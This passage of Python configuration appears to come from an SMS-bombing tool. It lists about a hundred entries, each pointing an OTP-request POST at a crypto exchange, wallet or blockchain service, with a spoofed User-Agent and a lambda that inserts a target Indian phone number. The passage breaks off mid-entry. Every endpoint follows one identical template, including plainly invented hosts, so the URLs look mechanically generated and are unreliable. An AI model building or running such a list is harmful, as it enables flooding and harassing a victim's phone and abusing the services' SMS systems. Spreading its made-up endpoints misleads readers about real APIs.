    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kraken.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 473
{
    'name': 'Gemini_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gemini.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 474
{
    'name': 'KuCoin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kucoin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 475
{
    'name': 'Bitfinex_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bitfinex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 476
{
    'name': 'Huobi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.huobi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 477
{
    'name': 'OKX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.okx.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 478
{
    'name': 'Bybit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bybit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 479
{
    'name': 'Gate.io_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gate.io/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 480
{
    'name': 'Bittrex_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bittrex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 481
{
    'name': 'Bitstamp_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bitstamp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 482
{
    'name': 'BlockFi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blockfi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 483
{
    'name': 'Nexo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nexo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 484
{
    'name': 'Celsius_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.celsius.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 485
{
    'name': 'Ledger_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ledger.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 486
{
    'name': 'Trezor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.trezor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 487
{
    'name': 'MetaMask_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.metamask.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 488
{
    'name': 'Trust_Wallet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.trustwallet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 489
{
    'name': 'Coinbase_Wallet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coinbasewallet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 490
{
    'name': 'Exodus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.exodus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 491
{
    'name': 'Atomic_Wallet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.atomicwallet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 492
{
    'name': 'Jaxx_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.jaxx.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 493
{
    'name': 'Guarda_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.guarda.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 494
{
    'name': 'Coinomi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coinomi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 495
{
    'name': 'Electrum_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.electrum.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 496
{
    'name': 'Mycelium_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mycelium.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 497
{
    'name': 'BitPay_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bitpay.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 498
{
    'name': 'CoinPayments_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coinpayments.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 499
{
    'name': 'NOWPayments_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nowpayments.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 500
{
    'name': 'CoinGate_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coingate.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 501
{
    'name': 'Blockchain_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blockchain.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 502
{
    'name': 'Paxful_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.paxful.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 503
{
    'name': 'LocalBitcoins_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.localbitcoins.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 504
{
    'name': 'Hodl_Hodl_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hodlhodl.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 505
{
    'name': 'Bisq_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bisq.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 506
{
    'name': 'Uniswap_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.uniswap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 507
{
    'name': 'PancakeSwap_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pancakeswap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 508
{
    'name': 'SushiSwap_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sushi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 509
{
    'name': 'Curve_Finance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.curve.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 510
{
    'name': 'Aave_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aave.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 511
{
    'name': 'Compound_Finance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.compound.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 512
{
    'name': 'Yearn_Finance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yearn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 513
{
    'name': 'Balancer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.balancer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 514
{
    'name': 'MakerDAO_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.makerdao.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 515
{
    'name': 'Lido_Finance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lido.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 516
{
    'name': 'Rocket_Pool_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rocketpool.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 517
{
    'name': 'Stader_Labs_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.staderlabs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 518
{
    'name': 'Ankr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ankr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 519
{
    'name': 'Infura_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.infura.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 520
{
    'name': 'Alchemy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.alchemy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 521
{
    'name': 'Moralis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.moralis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 522
{
    'name': 'ThirdWeb_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.thirdweb.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 523
{
    'name': 'Web3Auth_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.web3auth.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 524
{
    'name': 'Torus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.torus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 525
{
    'name': 'Magic_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.magic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 526
{
    'name': 'Privy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.privy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 527
{
    'name': 'WalletConnect_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.walletconnect.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 528
{
    'name': 'EIP_4361_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.eip4361.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 529
{
    'name': 'ENS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ens.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 530
{
    'name': 'IPFS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ipfs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 531
{
    'name': 'Filecoin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.filecoin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 532
{
    'name': 'Arweave_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.arweave.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 533
{
    'name': 'Storj_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.storj.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 534
{
    'name': 'Sia_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sia.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 535
{
    'name': 'Golem_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.golem.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 536
{
    'name': 'Render_Network_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.render.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 537
{
    'name': 'Livepeer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.livepeer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 538
{
    'name': 'Theta_Network_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.theta.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 539
{
    'name': 'VeChain_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vechain.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 540
{
    'name': 'IOTA_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.iota.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 541
{
    'name': 'Hedera_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hedera.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 542
{
    'name': 'Algorand_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.algorand.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 543
{
    'name': 'Avalanche_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.avalanche.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 544
{
    'name': 'Solana_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.solana.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 545
{
    'name': 'Polygon_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.polygon.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 546
{
    'name': 'Cardano_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cardano.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 547
{
    'name': 'Polkadot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.polkadot.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 548
{
    'name': 'Kusama_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kusama.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 549
{
    'name': 'Near_Protocol_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.near.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 550
{
    'name': 'Cosmos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cosmos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 551
{
    'name': 'Tezos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tezos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 552
{
    'name': 'EOS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.eos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 553
{
    'name': 'TRON_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tron.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 554
{
    'name': 'NEO_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.neo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 555
{
    'name': 'NEM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nem.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 556
{
    'name': 'IOST_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.iost.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 557
{
    'name': 'Zilliqa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zilliqa.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 558
{
    'name': 'Ontology_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ontology.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 559
{
    'name': 'Waves_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.waves.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 560
{
    'name': 'Elrond_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.elrond.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 561
{
    'name': 'Harmony_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.harmony.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 562
{
    'name': 'Celo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.celo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 563
{
    'name': 'Flow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.flow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 564
{
    'name': 'Aptos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aptos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 565
{
    'name': 'Sui_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sui.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 566
{
    'name': 'Sei_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sei.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 567
{
    'name': 'Injective_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.injective.com/v1/auth/otp',
